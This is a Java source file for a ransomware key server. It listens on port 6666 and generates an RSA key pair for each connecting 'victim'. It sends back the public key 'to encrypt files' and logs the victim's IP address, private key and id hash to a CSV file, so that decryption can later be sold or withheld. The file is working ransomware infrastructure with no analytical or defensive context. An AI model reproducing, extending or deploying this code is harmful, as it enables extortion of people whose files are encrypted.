/*
Functionality:
receives sent key and record it to a json file
*/



import java.io.*;
import java.net.*;
import java.util.*;
import java.io.PrintWriter;
import java.io.FileWriter;
import java.security.*;
import java.security.spec.X509EncodedKeySpec;



public class KeyServer {
  public static final String ANSI_RESET = "\u001B[0m";
  public static final String ANSI_CYAN = "\u001B[36m";
  private Socket          socket   = null;
  private ServerSocket    server   = null;

  public KeyServer(int port)
  {
      try
      {
          server = new ServerSocket(port);
          KSListener l = new KSListener(socket, server);
          l.start();

      }
      catch(IOException i)
      {
          System.out.println(i.getStackTrace());
      }
  }

  public static void main(String args[])
  {
      KeyServer server = new KeyServer(6666);
  }
}


class KSListener extends Thread {
  public static final String ANSI_RESET = "\u001B[0m";
  public static final String ANSI_CYAN = "\u001B[36m";
  public static final String KS_HEADER = ANSI_CYAN + "[KeyServer]: " + ANSI_RESET;
  private Socket          socket   = null;
  private ServerSocket    server   = null;
  private DataInputStream in       =  null;

  public KSListener(Socket socket, ServerSocket server) {
    this.socket = socket;
    this.server = server;
  }
  public void run() {
    try
    {
    System.out.println(KS_HEADER + "key server started");
    System.out.println(KS_HEADER + "Waiting for clients ...");
    while (true) {
      socket = server.accept();
      System.out.println(KS_HEADER + "Client connected");

      // takes input from the client socket
      in = new DataInputStream(
          new BufferedInputStream(socket.getInputStream()));

      KSHandler handler = new KSHandler(socket, in);
      handler.start();
    }
  }
  catch(IOException i)
  {
      System.out.println(i.getStackTrace());
  }
  }
}



class KSHandler extends Thread {
  public static final String ANSI_RESET = "\u001B[0m";
  public static final String ANSI_CYAN = "\u001B[36m";
  public static final String KS_HEADER = ANSI_CYAN + "[KeyServer]: " + ANSI_RESET;
  private KeyPairGenerator generator;
  private KeyPair pair;
  private byte[] priv;
  private String b64privkey;
  private byte[] pub;
  private String b64pubkey;
  private Socket socket;
  private DataInputStream in;
  private DataOutputStream out;

  public KSHandler(Socket socket, DataInputStream in) {
    try {
      this.socket = socket;
      this.in = in;
      generator = KeyPairGenerator.getInstance("RSA");
      generator.initialize(2048);
      pair = generator.generateKeyPair();
      pub = pair.getPublic().getEncoded();
      priv = pair.getPrivate().getEncoded();
      b64pubkey = Base64.getEncoder().encodeToString(pub);
      b64privkey = Base64.getEncoder().encodeToString(priv);
      out = new DataOutputStream(socket.getOutputStream());
    } catch (Exception e) {
      System.out.println("Init failed");
    }
  }

  public void run() {
    String keyString = "";
    String b64IdHash = "";
    while (!socket.isClosed())
    {
        try
        {
            b64IdHash = in.readUTF(); // read victim id hash
            out.writeUTF(b64pubkey); // send public key to encrypt files
            System.out.println(KS_HEADER + "Host: \t\t" + socket.getRemoteSocketAddress());
            System.out.println(KS_HEADER + "id: \t\t" + b64IdHash);
            System.out.println();
            if (socket.getInputStream().read() == -1) {
              break;
            }

        }
        catch(IOException i)
        {
            ;
        }
    }

    /*
    This will log the ip address, keyString, and b64 encoded hash of id with the following format to a csv file:
    ip,b64privkey,b64IdHash
    */
    if (!b64IdHash.equals("")) {
      try {
        File f = new File("keys.csv");
        if (!f.exists()){
          f.createNewFile();
        }
        PrintStream csv = new PrintStream(f);
        csv.println(socket.getRemoteSocketAddress().toString().split(":")[0].substring(1) + "," + b64privkey + "," + b64IdHash);
      } catch (Exception e) {
        System.out.println(e);
      }
    }
    close();
  }

  public void close() {
    try
    {
        in.close();
        socket.close();
    }
    catch(IOException i)
    {
        System.out.println(i);
    }
  }
}
